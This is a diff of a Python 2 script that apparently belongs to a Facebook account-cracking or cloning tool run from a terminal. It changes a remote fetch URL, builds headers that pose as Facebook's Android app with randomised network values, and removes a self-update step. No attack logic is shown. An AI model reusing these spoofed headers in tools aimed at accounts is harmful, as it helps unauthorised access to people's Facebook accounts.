@@ -14,7 +14,7 @@ except ImportError:
 os.system("clear")
 """
 try:
-    my = requests.get("https://raw.githubusercontent.com/cyber-jam/sani/main/server.txt").text
+    my = requests.get("https://m.facebook.com/jam.shahrukh.official")
 except requests.exceptions.ConnectionError:
     print("")
     print("\t    \033[1;97mTurn on mobile data\033[0;97m")
@@ -48,7 +48,15 @@ except OSError:
     pass
 bd=random.randint(2e7, 3e7)
 sim=random.randint(2e4, 4e4)
-header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (Linux; Android 5.1.1; Nexus 5 Build/LMY48B; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.65 Mobile Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
+header = {
+    'x-fb-connection-bandwidth': repr(bd),
+    'x-fb-sim-hni': repr(sim),
+    'x-fb-net-hni': repr(sim),
+    'x-fb-connection-quality': 'EXCELLENT',
+    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+    'user-agent': 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]',
+    'content-type': 'application/x-www-form-urlencoded',
+    'x-fb-http-engine': 'Liger' }
 reload(sys)
 sys.setdefaultencoding("utf-8")
 c = "\033[1;32m"
@@ -57,7 +65,6 @@ c3 = "\033[1;31m"
 #MyLogo
 def logo():
     os.system('echo -e "\n\n\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m█████████  \033[1;92m ▀\n\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m  ███         \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m  ██████████  \033[1;96m██████████  \033[1;93m███   ███  \033[1;92m███ \n\033[1;91m         ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  \n\033[1;91m  ███    ███  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███  \n\033[1;91m  ██████████  \033[1;96m███    ███  \033[1;93m███   ███  \033[1;92m███ \x1b[1;90mQUEEN\n\033[1;94m══════════════════════════════════════════════\n\033[1;90m➣ Author : \033[1;97mSTYLISH QUEEN\n\033[1;90m➣ Github : \033[1;97mhttps://github.com/stylish-queen\n\033[1;90m➣ Fb Page: \033[1;97mJam Shahrukh Official\n\033[1;94m══════════════════════════════════════════════"| lolcat')
-    os.system("git pull")
 
 def menu():
     global token
